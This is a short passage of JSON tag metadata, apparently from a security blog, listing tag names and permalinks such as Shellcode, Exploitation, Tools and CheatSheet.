e","permalink":"https://blog.jhyeon.dev/tags/Shellcode/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://blog.jhyeon.dev/tags/Exploitation/"},{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"},{"name":"CheatSheet","slug":"CheatSheet","permalink":"https://blog.jhyeon.dev/tags/CheatSheet/"}]}